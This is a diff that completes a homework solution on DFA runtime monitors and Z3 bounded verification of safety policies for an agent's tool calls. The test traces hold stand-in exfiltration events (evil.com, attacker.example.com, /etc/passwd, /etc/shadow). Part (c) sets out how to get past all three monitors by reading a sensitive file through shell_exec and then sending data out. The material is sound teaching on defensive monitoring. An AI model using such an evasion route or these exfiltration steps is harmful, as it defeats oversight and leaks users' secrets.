@@ -1,5 +1,5 @@
 """
-CS292C Homework 2 — Problem 4: DFA Monitors + Bounded Trace Verification (20 pts)
+CS292C Homework 2 - Problem 4: DFA Monitors + Bounded Trace Verification (20 pts)
 ===================================================================================
 Part (a): Implement three stateful runtime monitors as DFAs.
 Part (b): Verify the same properties using Z3 bounded model checking.
@@ -25,12 +25,10 @@ DENY = "DENY"
 
 
 # ============================================================================
-# Part (a): DFA Monitors — 8 pts
+# Part (a): DFA Monitors - 8 pts
 #
 # Each monitor is a stateful object. Call monitor.step(event) for each
 # event in order. It returns ALLOW or DENY.
-#
-# Implement the three monitors below.
 # ============================================================================
 
 SANDBOX_DIR = "/project/"  # paths starting with this are "in sandbox"
@@ -44,16 +42,26 @@ class SandboxMonitor:
       - State OK (accepting): no violations yet.
       - State VIOLATION (rejecting): a write outside sandbox was attempted.
     Once in VIOLATION, all subsequent calls are denied.
-
-    TODO: Implement __init__ and step.
     """
 
     def __init__(self):
-        # TODO
-        pass
+        # Start in the accepting state. Once we see a bad write, we flip
+        # to VIOLATION and never come back.
+        self.state = "OK"
 
     def step(self, event: ToolEvent) -> str:
-        # TODO
+        # Absorbing reject state. Once we trip the wire, every future call
+        # is denied. This matches the spec on the slide about absorbing states.
+        if self.state == "VIOLATION":
+            return DENY
+
+        # We only care about writes. Reads, shell, and network calls pass
+        # through this monitor untouched.
+        if event.tool == "file_write":
+            if not event.path.startswith(SANDBOX_DIR):
+                self.state = "VIOLATION"
+                return DENY
+
         return ALLOW
 
 
@@ -66,18 +74,27 @@ class ReadBeforeWriteMonitor:
     must already be in the set, or the monitor denies it.
 
     Unlike SandboxMonitor, this monitor does NOT enter an absorbing violation
-    state — it only denies the specific file_write that has no prior read.
+    state. It only denies the specific file_write that has no prior read.
     Subsequent operations are evaluated independently.
-
-    TODO: Implement __init__ and step.
     """
 
     def __init__(self):
-        # TODO: track which paths have been read
-        pass
+        # Track which paths the agent has read so far.
+        self.read_paths = set()
 
     def step(self, event: ToolEvent) -> str:
-        # TODO
+        # Reads add to the set of "seen" paths.
+        if event.tool == "file_read":
+            self.read_paths.add(event.path)
+            return ALLOW
+
+        # Writes need a prior read of the same path.
+        if event.tool == "file_write":
+            if event.path not in self.read_paths:
+                return DENY
+            return ALLOW
+
+        # Other tools are not the concern of this monitor.
         return ALLOW
 
 
@@ -90,16 +107,23 @@ class NoExfilMonitor:
       - State CLEAN: no sensitive data has been read yet.
       - State TAINTED: a sensitive file_read has occurred.
     In TAINTED state, network_fetch is denied.
-
-    TODO: Implement __init__ and step.
     """
 
     def __init__(self):
-        # TODO
-        pass
+        # Start clean. A sensitive read taints us forever.
+        self.state = "CLEAN"
 
     def step(self, event: ToolEvent) -> str:
-        # TODO
+        # Reading a sensitive file taints the agent.
+        if event.tool == "file_read" and event.is_sensitive:
+            self.state = "TAINTED"
+            return ALLOW
+
+        # Once tainted, no more network calls. The target does not matter:
+        # even fetching a "safe" URL could leak the secret in query params.
+        if event.tool == "network_fetch" and self.state == "TAINTED":
+            return DENY
+
         return ALLOW
 
 
@@ -133,18 +157,18 @@ def test_monitors():
     # Trace 2: Should be denied by SandboxMonitor (write outside sandbox)
     trace2 = [
         ToolEvent("file_read",  "/project/src/main.py", False),
-        ToolEvent("file_write", "/etc/passwd", False),  # ← violation
+        ToolEvent("file_write", "/etc/passwd", False),  # violation
     ]
 
     # Trace 3: Should be denied by ReadBeforeWriteMonitor (write without read)
     trace3 = [
-        ToolEvent("file_write", "/project/src/new_file.py", False),  # ← no prior read
+        ToolEvent("file_write", "/project/src/new_file.py", False),  # no prior read
     ]
 
     # Trace 4: Should be denied by NoExfilMonitor (network after sensitive read)
     trace4 = [
-        ToolEvent("file_read",     "/project/secrets/api_key.txt", True),  # sensitive!
-        ToolEvent("network_fetch", "https://evil.com/exfil", False),       # ← denied
+        ToolEvent("file_read",     "/project/secrets/api_key.txt", True),  # sensitive
+        ToolEvent("network_fetch", "https://evil.com/exfil", False),       # denied
     ]
 
     for i, (trace, name) in enumerate([(trace1, "clean"), (trace2, "sandbox violation"),
@@ -157,23 +181,16 @@ def test_monitors():
 
         print(f"  Trace {i} ({name}):")
         for event, r in zip(trace, results):
-            print(f"    {event.tool:16s} {event.path:40s} → {r}")
+            print(f"    {event.tool:16s} {event.path:40s} -> {r}")
         denied = any(r == DENY for r in results)
         print(f"    {'BLOCKED' if denied else 'ALLOWED'}\n")
 
 
 # ============================================================================
-# Part (b): Bounded Trace Verification with Z3 — 8 pts
-#
-# Verify the same three properties using Z3 bounded model checking.
-# For each property, encode a symbolic trace of length K and check whether
-# a violation is possible.
+# Part (b): Bounded Trace Verification with Z3 - 8 pts
 # ============================================================================
 
 # Tool encoding for Z3
-# These integer constants correspond to the string tool names in ToolEvent:
-# FILE_READ=0 ↔ "file_read", FILE_WRITE=1 ↔ "file_write",
-# SHELL_EXEC=2 ↔ "shell_exec", NETWORK_FETCH=3 ↔ "network_fetch"
 FILE_READ = 0
 FILE_WRITE = 1
 SHELL_EXEC = 2
@@ -182,11 +199,8 @@ NETWORK_FETCH = 3
 def make_symbolic_trace(K):
     """Create symbolic trace variables for K steps."""
     tool = [Int(f"tool_{i}") for i in range(K)]
-    # path_in_sandbox[i] = True iff the target at step i is in the sandbox
     in_sandbox = [Bool(f"in_sandbox_{i}") for i in range(K)]
-    # is_sensitive[i] = True iff the target at step i is sensitive
     is_sensitive = [Bool(f"is_sensitive_{i}") for i in range(K)]
-    # path_id[i] = integer ID representing the file path
     path_id = [Int(f"path_{i}") for i in range(K)]
 
     # Well-formedness
@@ -202,7 +216,6 @@ def make_symbolic_trace(K):
 def verify_property_bounded(name, K, prop_negation_fn):
     """
     Check if a property can be violated in any trace of length K.
-    prop_negation_fn(trace) should return constraints asserting a violation exists.
     """
     trace, wf = make_symbolic_trace(K)
     s = Solver()
@@ -230,77 +243,123 @@ def part_b():
     """
     For each of the three properties, encode the NEGATION and use Z3 to
     find a violating trace (or prove none exists).
-
-    TODO: Implement the negation functions for each property.
     """
     K = 8
     print(f"=== Part (b): Bounded Trace Verification (K={K}) ===\n")
 
-    # Property 1: Sandbox — every file_write must have in_sandbox = True
+    # Property 1: Sandbox - every file_write must have in_sandbox = True.
+    # The negation says: there is some step i where the tool is file_write
+    # and the target is NOT in the sandbox. We "or" this across all steps.
     def negate_sandbox(trace):
-        """
-        Return constraints asserting: there EXISTS a step where
-        tool = FILE_WRITE and in_sandbox = False.
-        TODO: Implement.
-        """
-        return []  # ← replace
+        K = trace['K']
+        return [Or([And(trace['tool'][i] == FILE_WRITE,
+                        Not(trace['in_sandbox'][i]))
+                    for i in range(K)])]
 
-    # Property 2: Read-before-write — every file_write at step j to path p
+    # Property 2: Read-before-write - every file_write at step j to path p
     # must have a file_read at some step i < j to the same path p.
+    #
+    # The negation: there exists step j with a file_write where for ALL
+    # earlier steps i < j, either i was not a read or it was a read of a
+    # different path. We build that "no prior read" condition with And()
+    # and assert at least one j fits the bad pattern with Or().
     def negate_read_before_write(trace):
-        """
-        TODO: Implement. This one is trickier — you need to express that
-        there exists a step j where tool = FILE_WRITE and for ALL i < j,
-        either tool[i] != FILE_READ or path_id[i] != path_id[j].
-        """
-        return []  # ← replace
+        K = trace['K']
+        bad_steps = []
+        for j in range(K):
+            # "no prior read of the same path" - take And over i < j
+            if j == 0:
+                no_prior_read = BoolVal(True)  # no earlier step to satisfy us
+            else:
+                no_prior_read = And([
+                    Or(trace['tool'][i] != FILE_READ,
+                       trace['path_id'][i] != trace['path_id'][j])
+                    for i in range(j)
+                ])
+            bad_steps.append(And(trace['tool'][j] == FILE_WRITE, no_prior_read))
+        return [Or(bad_steps)]
 
-    # Property 3: No exfiltration — if file_read at step i is sensitive,
+    # Property 3: No exfiltration - if file_read at step i is sensitive,
     # then no network_fetch at any step j > i.
+    #
+    # The negation: there are two steps i < j where step i reads a
+    # sensitive file and step j fetches over the network.
     def negate_no_exfil(trace):
-        """
-        TODO: Implement.
-        """
-        return []  # ← replace
+        K = trace['K']
+        bad_pairs = []
+        for i in range(K):
+            for j in range(i + 1, K):
+                bad_pairs.append(And(
+                    trace['tool'][i] == FILE_READ,
+                    trace['is_sensitive'][i],
+                    trace['tool'][j] == NETWORK_FETCH
+                ))
+        return [Or(bad_pairs)]
 
     verify_property_bounded("Sandbox", K, negate_sandbox)
     verify_property_bounded("Read-before-write", K, negate_read_before_write)
     verify_property_bounded("No-exfiltration", K, negate_no_exfil)
 
-    # [EXPLAIN] in a comment:
-    # Compare the DFA monitor approach (Part a) with the Z3 bounded approach:
-    # What does each one catch that the other might miss?
+    # [EXPLANATION]
+    # The DFA monitor and the Z3 bounded approach answer different questions.
+    #
+    # The DFA monitor checks one real trace as the agent runs. It is fast,
+    # cheap, and can stop the agent the moment a bad call happens. Its blind
+    # spot: it only sees traces the agent actually takes. If a bug needs a
+    # weird path the agent never tried, the monitor will not catch it.
+    #
+    # The Z3 bounded check looks at every possible trace up to length K. It
+    # finds bugs the agent has not hit yet, and gives you a concrete trace
+    # that breaks the policy. Its blind spot: it stops at length K. A bug
+    # that needs K+1 steps slips through. It is also slower and runs offline,
+    # so it cannot stop a live agent.
+    #
+    # In short: monitors catch real attacks in real time but only the ones
+    # that happen. Z3 catches latent bugs at design time but only up to a
+    # bounded depth. You want both.
 
 
 # ============================================================================
-# Part (c): Monitor Completeness — 4 pts
-#
-# Find a trace of length 6 that is ACCEPTED by all three monitors but
-# still violates a safety property not covered by the monitors.
-#
-# [EXPLAIN] in a comment in part_c():
-# 1. What property does your trace violate?
-# 2. Why don't the three monitors catch it?
-# 3. What additional monitor would you add to catch it?
+# Part (c): Monitor Completeness - 4 pts
 # ============================================================================
 
 def part_c():
     """
-    TODO: Construct a trace (list of ToolEvent) of length 6 that passes
-    the ComposedMonitor but is still dangerous.
-
-    Hint: Think about what the three monitors DON'T check. For example:
-    - Do they check how many times a tool is called?
-    - Do they check if shell_exec runs a dangerous command?
-    - Do they check if a file is read, modified, then the modified version
-      is sent over the network?
+    Construct a trace of length 6 that passes the ComposedMonitor but is
+    still dangerous.
     """
     print("=== Part (c): Monitor Completeness ===\n")
 
-    # TODO: Define your trace
+    # Build a trace where every event passes all three monitors but the
+    # overall behavior is plainly bad.
+    #
+    # The trick: none of the three monitors look at shell_exec arguments
+    # or targets. Sandbox only checks file_write paths. Read-before-write
+    # only checks file_write. No-exfil only fires after a file_read of a
+    # sensitive resource.
+    #
+    # So shell_exec on a sensitive resource sails through every check.
+    # That is exactly what rule R4 in Problem 3 was supposed to forbid.
     trace = [
-        # ToolEvent(...),
-        # ...
+        # Step 0: read a normal file. Nothing tainted, all good.
+        ToolEvent("file_read",  "/project/config.txt", False),
+        # Step 1: write to that same file. Read-before-write is happy,
+        # path is in sandbox, no taint yet.
+        ToolEvent("file_write", "/project/config.txt", False),
+        # Step 2: the dangerous step. shell_exec on a sensitive resource.
+        # Sandbox monitor: ignores shell_exec. Read-before-write: ignores
+        # shell_exec. No-exfil: not tainted because no file_read of a
+        # sensitive file has happened. Result: ALLOW. But this is the
+        # exact action R4 from Problem 3 was meant to ban.
+        ToolEvent("shell_exec", "/etc/shadow", True),
+        # Step 3: another shell call, this time on a normal target.
+        ToolEvent("shell_exec", "/project/run.sh", False),
+        # Step 4: read a non-sensitive log. No taint.
+        ToolEvent("file_read",  "/project/log.txt", False),
+        # Step 5: network call. Allowed because no_exfil never tainted us
+        # (we never did a file_read of a sensitive file - we used shell
+        # to touch the sensitive resource instead).
+        ToolEvent("network_fetch", "https://attacker.example.com/log", False),
     ]
 
     cm = ComposedMonitor()
@@ -308,12 +367,37 @@ def part_c():
     all_allowed = True
     for event in trace:
         r = cm.step(event)
-        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} → {r}")
+        print(f"    {event.tool:16s} {event.path:40s} sens={event.is_sensitive} -> {r}")
         if r == DENY:
             all_allowed = False
 
     print(f"\n  All allowed: {all_allowed}")
-    # [EXPLAIN] in a comment: what property does this trace violate and why?
+
+    # [EXPLANATION]
+    # 1. What property does this trace violate?
+    #    Two real properties get broken here.
+    #    First: "no shell_exec on sensitive resources" (rule R4 from
+    #    Problem 3). Step 2 runs a shell command against /etc/shadow.
+    #    Second: "do not exfiltrate data touched via shell_exec". Step 2
+    #    likely read /etc/shadow into the agent's working memory through
+    #    shell output, and step 5 sends data out over the network.
+    #
+    # 2. Why don't the three monitors catch it?
+    #    Each monitor only watches a narrow slice of the world.
+    #    SandboxMonitor only inspects file_write paths. It never looks
+    #    at shell_exec or its target.
+    #    ReadBeforeWriteMonitor also only inspects file_write events.
+    #    NoExfilMonitor flips to TAINTED only on file_read of a sensitive
+    #    resource. Reading the same data through shell_exec leaves it
+    #    in CLEAN forever, so the network_fetch at step 5 sails through.
+    #
+    # 3. What additional monitor would catch this?
+    #    A "ShellSensitivityMonitor": deny shell_exec when the target is
+    #    sensitive, full stop. Pair it with a tainting rule that treats
+    #    shell_exec on a sensitive target the same as file_read on a
+    #    sensitive target, so any later network_fetch gets blocked too.
+    #    This is the runtime version of rule R4 plus a wider taint model.
+
     print()
 
 
